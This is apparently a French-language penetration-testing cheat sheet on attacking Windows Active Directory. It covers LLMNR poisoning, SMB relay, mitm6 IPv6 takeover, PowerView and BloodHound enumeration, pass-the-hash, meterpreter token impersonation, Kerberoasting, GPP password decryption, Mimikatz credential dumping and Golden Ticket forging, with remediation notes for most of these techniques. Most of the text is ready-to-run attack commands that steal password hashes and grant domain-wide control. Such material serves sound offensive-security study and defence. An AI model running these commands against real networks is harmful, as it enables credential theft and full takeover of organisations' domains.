# INITIAL VECTOR

## 1. LLMNR Poisoning

### 1.1 LLMNR c’est quoi ?

- Permet d’identifier des hôtes quand le DNS n’y arrive pas.
- Auparavant NBT-NS
- Problème : les services utilisent un username et un hash NTLMv2 quand ils nous répondent.

### 1.2 Comment faire ?

- Responder

*responder -I <network_interface>*
*responder -I <network_interface> -rdw (attention, vérifier que les flags ne cassent rien, ça peut être le cas avec -r pour répondre au netbios wredir et -d pour répondre aux suffixes de domaine)*

On récupère des hashes que l’on casse ensuite avec John ou Hashcat
*hashcat -m 5600 hash.txt rockyou.txt*


### 1.3 Remédiation

- Désactiver LLMNR et NBT-NS
	- Pour LLMNR : sélectionner « Turn OFF Multicast Name Resolution » dans Local 	Computer Policy > Computer Configuration > Administrative Templates > Network > DNS 	Client dans Group Policy Editor ».
	- Pour NBT-NS : Aller dans Network Connections > Networ Adapter Properties > TCP/IPv4 	Properties > Advanced tab > WINS tab et sélectionner « Disable NetBIOS over TCP/IP ».

Si l’entreprise ne peut pas les désactiver :
	- Mettre en place un NAC (Network Access Control)
	- Mettre en place une politique de mots de passe fort

## 2. SMB Relay Attack

### 2.1 C’est quoi ?

Au lieu de casser les hashes que l’on a récupérés avec Responder, nous allons les relayer à des machines afin d’en obtenir l’accès.

Prérequis : 
- SMB signing (signature SMB) doit être désactivée sur la machine cible
- Le user dont le hash est relayé doit être admin sur la machine cible

Étapes :
1- Trouver des hôtes qui ont la signature SMB désactivée : 
	- *nmap –script=sm2-security-mode.nse -p445 192.168.10.0/24*
Voir dans le résultat, si il y a not required, on peut faire l’attaque sur cette machine
On ajoute les IP dans targets.txt

2- Aller dans /etc/responder/Responder.conf et mettre SMB et HTTP en OFF
3- Lance Responder : même commande que précédemment
4- Lance *python ntlmrelayx.py -tf targets.txt -smb2support* (on trouve cet outil dans Impacket)

Si ça marche, on peut obtenir des hashes du fichier SAM (usernames et hashes des users locaux).
On a donc la possibilité de bouger latéralement sur la machine.

On peut aussi obtenir un shell :
- *ntlmrelayx.py -tf targets.txt -smb2support -i*
- On se connect avec Netcat au shell qui nous est indiqué dans la réponse de ntlmrelayx :
	- *nc 127.0.0.1 11001*
On est dans un shell SMB

### 2.2 Remédiation

1. Activé la signature SMB sur toutes les machines
- Pour : stop l’attaque
- Contre : peut poser des soucis de performances avec les copies de fichiers

2. Désactivé l’authentification NTLM sur le réseau
- Pour : stop l’attaque
- Contre : si Kerberos ne fonctionne plus, Windows retourne sur NTLM par défaut

3. Account tiering
- Pour : limite les admins du domaine à certaines tâches (comme se connecter uniquement aux serveurs ayant besoin d’un admin du domaine)
- Contre : implémenter la politique peut être difficile

4. Restriction sur l’admin local
- Pour : prévient le mouvement latéral
- Contre : peut entraîner une augmentation du nombre de tickets au service desk

## 3. IPv6 attack (DNS take over attack via IPv6)

### 3.1 C’est quoi ?

Une autre forme de relay, mais très reliable

IPv6 peut être activé mais personne ne fait le DNS, on prend donc la place du DNS
On peut alors avoir l’authentification au Domaine Controller via LDAP ou SMB si on relaie un domain admin.

On fait tourner mitm6 pendant 5 ou 10 minutes car ça risque de perturber l’environnement (cf : https://www.evolvesecurity.com/blog-posts/tools-of-the-trade-ipv6-dns-takeover-with-mitm6)

### 3.2 Etapes

On utilise l’outil mitm6
*cd /opt*
*git clone https://github.com/dirkjanm/mitm6*
cd dans le dossier
*pip2 install .*


On lance mitm6 : *mitm6 -d <domain name>*
On lance : *ntlmrelayx.py -6 -t ldaps://<IP domain controller> -wh exemple.domain.local -l lootme*

-wh : lorsqu'une demande NTLM est reçue par ntlmrelayx, il vérifie l'adresse IP source de la demande. Si cette adresse IP correspond à une des adresses IP spécifiées avec le flag -wh, alors ntlmrelayx procédera au relaie de l'authentification NTLM vers cette cible spécifique.

### 3.3 Remédiations

Définir des block rules si on ne peut pas désactiver l’IPv6 :
- Inbound  Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)
- Inbound : Core Networking – Router Advertisement (ICMPv6-In)
- Outbound : Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)

Si WPAD n’est pas utilisé en interne, le désactiver avec les Group Policy et en désactivant le service WinHttpAutoProxySvc

Autoriser la signature LDAP et le LDAP channel binding

# POST-COMPROMISE ENUMERATION

## 1. Powerview

### 1.1 Présentation

Télécharger sur : https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Il faut placer le script sur une machine que l’on a compromis

### 1.2 Énumération du domaine

Commandes: 
- cmd
- On va dans le folder où PowerView se trouve
- *powershell -ep bypass*
- *. .\PowerView.ps1*

- *Get-NetDomain*
Information sur le domaine

- *Get-NetDomainController*
Information sur le DC spécifiquement, permet de l’identifier si ce n’est pas encore le cas

- *Get-DomainPolicy*
 Montre les Policies sur le Domaines
	- *(Get-DomainPolicy). "system access"*
	Infos sur la policy spécifiée

- *Get-NetUser*
Infos sur les users
	- *Get-NetUser | select cn*
	Uniquement les nom d’utilisateurs
	- *Get-NetUser | select samaccountname*
	Uniquement les sam account name
	- *Get-NetUser | select description*
	Affiche la description uniquement

- *Get-UserProperty*
Properties d’un user
	- *Get-UserProperty -Properties pwdlastset*
	Savoir quand un mdp a été config pour la dernière fois
	- *Get-UserProperty -Properties logonaccount*
	Permet d’identifier les comptes honeypot
	- *Get-UserProperty -Properties badpwdcount*
	Savoir combien d’échecs ont été fait avec les mdp de chaque compte

- *Get-NetComputer*
Liste des machines sur le domaine
	- *Get-NetComputer -FullData*
	Plus d'infos
	- *Get-NetComputer -FullData | select OperatingSystem*
	Voir les OS présents sur le domaine

- *Get-NetGroup*
Liste les groupes
	- *Get-NetGroup -Groupname "Domain Admins"*
	Listes uniquement les groupes avec le nom selectionné
	- *Get-Netgroup -Groupname \*admin\**
	Listes les groupes avec "admin" dans leur nom
	- *Get-NetGroupeMember -GroupName "Domain Admins"*
	Nous donne la liste des users dans le groupe sélectionné


- *Invoke-ShareFinder*
Liste les shares SMB sur le réseau

- *Get-NetGPO*
Liste les group policies
	- *Get-NetGPO | select dsiplayname, whenchanged*
	Liste les noms des policies de groupe et la date de la dernière modif

## 2. Bloodhound

### 2.1 Installation

*apt install bloodhound*

*neo4j console*
On change notre mdp par défaut

*bloodhound*
(creds neon4j)

### 2.2 Utilisation

On récupère https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 et https://github.com/dirkjanm/BloodHound.py

#### 2.2.1 SharpHound
cmd
*powershell -ep bypass*
*. .\SharpHound.ps1*
*Invoke-BloodHound -CollectionMethod All -Domain exemple.local -ZipFileName file.zip*
Copie le zip sur notre machine d'attaques

Sur Bloodhound :
On clique sur Update datas, on sélectionne le zip
On peut commencer

# POST-COMPROMISE ATTACKS

## 1. Pass the hash / Pass the password

Si on casse le mot de passe on si on dump les hashes de la SAM, on peut effectuer un mouvement latéral sur le réseau. On peut utiliser l'outil crackmapexec

### 1.1 Installer crackmapexec

*apt install crackmapexec*

### 1.2 Utilisation

#### 1.2.1 Pass the password

*crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>*

Si on a un match:
On se connecte :
*psexec.py  <domaine_name>/jdoe:Pass123@192.168.12.12*
On essaie de dumper la SAM :
*crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass> --sam*

Dumper les hash avec secretsdump :
*secretsdump.py <domain_name>/jdoe:Pass123@192.168.12.12*
On récupère les hashes

Casser les hashes:
*hashcat -m 1000 hash.txt rockyou.txt*

#### 1.2.2 Pass the Hash 

*crackmapexec smb 192.168.1.0/24 -u "John Doe" -H <copier hash ici> --local-auth*

On peut aussi se connecter avec psexec pour avoir un shell:
*psexec.py "john doe":@192.168.12.12 -hashes <copier le hash ici>*

### 1.3 Remédiation

Difficile de l'empêcher complètement.

- Eviter de réutiliser des creds :
	- Réutilisation du mdp d'admin local
	- Désactiver les comptes Guest et Administrator 
	- Moindre privilège : limiter qui peut être local admin

- Mdp fort

- Privilege Access Management (PAM)
	- vérifier l'accès à un compte sensible lorsque cela est nécessaire
	- change le mdp automatiquement à chaque accès et log out
	- Limite ces attaques car les hashes et les mdp sont fort et changés régulièrement


## 2. Token Impersonation

### 2.1 Overview

Deux types de tokens : 
	- Delegate : créés pour se logger à une machine ou utiliser RDP
	-  Impersonate: créés lorsque les utilisateurs se connectent de manière non interactive à un système, par exemple en accédant à un disque partagé sur le réseau. En général, les utilisateurs ne sont pas invités à fournir des informations d'identification lorsqu'ils accèdent au partage ; ils utilisent leurs jetons pour l'accès.

### 2.2 Avec Incognito (Metasploit)

On part du principe que l'on a déjà un shell avec Metasploit (en utilisant windows/smb/psexec)
Payload : *windows/x64/meterpreter/reverse_tcp*

Sur la session meterpreter:
*load incognito*
*list_tokens -u (liste les tokens)*
*impersonate_token <nom trouver avec la commande précédente>* (ex: domain\\administrator)
*whoami* (on est l'utilisateur sélectionné précédemment)
*rev2self* (on redevient le user que l'on était avant l'attaque)

### 2.3 Remédiation

- Limiter les autorisations afin que les utilisateurs et les groupes d'utilisateurs ne puissent pas créer de tokens. Ce paramètre ne doit être défini que pour le compte système local. GPO : Configuration de l'ordinateur > [Stratégies] > Paramètres Windows > Paramètres de sécurité > Stratégies locales > Attribution des droits d'utilisateur : Créer un objet jeton. Définissez également qui peut créer un jeton au niveau du processus, uniquement pour le service local et le service réseau, par l'intermédiaire d'un GPO : Configuration de l'ordinateur > [Politiques] > Paramètres Windows > Paramètres de sécurité > Politiques locales > Attribution des droits d'utilisateur : Remplacer un jeton de niveau processus.

- Les administrateurs doivent se connecter en tant qu'utilisateur standard, mais exécuter leurs outils avec des privilèges d'administrateur en utilisant la commande intégrée de manipulation des jetons d'accès (runas).

- Un adversaire doit déjà disposer d'un accès de niveau administrateur sur le système local pour pouvoir utiliser pleinement cette technique ; veillez à limiter les utilisateurs et les comptes aux privilèges les moins importants dont ils ont besoin.


## 3. Kerberoasting

### 3.1 Overview

Le but est d'obtenir un TS et déchiffrer le hash du compte associé

On doit avoir les creds d'un user valide (même si pas admin).

### 3.2 Déroulement de l'attaque

*GetUserSPNs.py <domain_name.local>/jdoe:Pass123 -dc-ip <IP du DC> -request*

On obtient le hash d'un service
On le copie et on le casse

*hashcat -m 13100 hash.txt rockyou.txt*
Si on connais le -m : *hashcat --help | grep Kerberos*


### 3.3 Remédiation

- Mdp fort
- Moindre privilège 

## 4. GPP Password Attacks

### 4.1 Overview

Attaque assez ancienne mais bon à checker. Patcher avec MS14-025.
Exploite les préférences de stratégie de groupe (GPP) :

Exposition des mots de passe : Les préférences de stratégie de groupe GPP permettent d'enregistrer des mots de passe de manière non sécurisée (c'est-à-dire en texte brut) dans les objets de stratégie de groupe. Ces mots de passe sont stockés dans le fichier SYSVOL, qui est accessible à tous les utilisateurs et ordinateurs du domaine.
    1. Récupération des mots de passe : Les attaquants peuvent utiliser des outils et des scripts pour récupérer et déchiffrer les mots de passe exposés dans les préférences de stratégie de groupe. Une fois récupérés, ces mots de passe peuvent être utilisés pour compromettre des comptes, accéder à des systèmes, ou effectuer d'autres actions malveillantes.
    2. Impact et conséquences : L'attaque GPP peut avoir des conséquences graves, car elle peut permettre aux attaquants d'obtenir des accès non autorisés à des ressources et des informations sensibles, compromettre la sécurité du réseau, et entraîner des violations de données et d'autres incidents de sécurité.
    3. Impact et conséquences : L'attaque GPP peut avoir des conséquences graves, car elle peut permettre aux attaquants d'obtenir des accès non autorisés à des ressources et des informations sensibles, compromettre la sécurité du réseau, et entraîner des violations de données et d'autres incidents de sécurité.

### 4.2 Etapes

On a besoin d'un user account pour accéder au dossier Sysvol
On cherche le cpassword dans un fichier xml. On a aussi le nom du user

On copie le hash de cpassword

*gpp-decrypt <copie hash ici>*

## 5. Credentials Dumping avec Mimikatz

### 5.1 Présentation de Mimikatz

Outils pour voir et voler des creds ou encore générer des tickets Kerberos.
Il peut aussi dumper des creds stockées dans la mémoire de la machine.

Parmi les attaques possibles : Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket

On doit être admin local

### 5.2 Dumping des creds

cmd
*mimikatz.exe*
*privilege::debug* (si "20 OK" on est bon)
*sekurlsa::logonpasswords*
On peut récup les hashes qui sont affichés
*lsadump::sam* (dumper la SAM)
*lsadump::lsa /patch* (on obtient les hashes des users via le dump du lsa, local security authority)

## 6. Golden Ticket (et Pass-the-Ticket)

Si on récupère le hash du krbtgt (par exemple avec mimikatz), on peut forger un golden ticket

On utilise Mimikatz

cmd
*mimikatz.exe*
*privilege::debug* (si "20 OK" on est bon)
*lsadump::lsa /inject /name:krbtgt*
On prend note de : SID du domaine (S-1-5....) et le NTLM du krbtgt
*kerberos::golden /User:Pentester /domain;<domain_name.local> /sid:<copie_sid>/krbtgt:<hash_NTLM_krbtgt> /id:500 /ptt*
*misc::cmd* (on a un prompt avec le golden ticket)

On a présent un accès quasi illimité à l'ensemble du domaine.   
Par exemple on peut avec un shell sur une machine :
*psexec.exe \\<Nom de la machine> cmd.exe*

